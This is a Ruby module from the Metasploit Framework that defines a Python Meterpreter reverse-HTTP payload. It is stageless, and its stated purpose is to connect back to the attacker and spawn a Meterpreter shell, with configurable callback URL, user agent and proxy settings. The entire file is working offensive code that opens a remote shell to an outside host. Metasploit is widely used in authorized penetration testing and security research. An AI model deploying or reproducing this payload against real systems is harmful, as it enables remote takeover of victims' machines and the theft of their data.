##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_http'
require 'msf/core/payload/python'
require 'msf/core/payload/python/meterpreter_loader'
require 'msf/core/payload/python/reverse_http'
require 'msf/base/sessions/meterpreter_python'

module MetasploitModule

  CachedSize = 71930

  include Msf::Payload::Single
  include Msf::Payload::Python
  include Msf::Payload::Python::ReverseHttp
  include Msf::Payload::Python::MeterpreterLoader

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Python Meterpreter Shell, Reverse HTTP Inline',
      'Description' => 'Connect back to the attacker and spawn a Meterpreter shell',
      'Author'      => 'Spencer McIntyre',
      'License'     => MSF_LICENSE,
      'Platform'    => 'python',
      'Arch'        => ARCH_PYTHON,
      'Handler'     => Msf::Handler::ReverseHttp,
      'Session'     => Msf::Sessions::Meterpreter_Python_Python
    ))

    register_advanced_options(
      Msf::Opt::http_header_options +
      Msf::Opt::http_proxy_options
    )
  end

  def generate_reverse_http(opts={})
    opts[:uri_uuid_mode] = :init_connect
    met = stage_meterpreter({
      url:             generate_callback_url(opts),
      http_user_agent: opts[:user_agent],
      http_proxy_host: opts[:proxy_host],
      http_proxy_port: opts[:proxy_port],
      stageless:       true
    })

    py_create_exec_stub(met)
  end
end
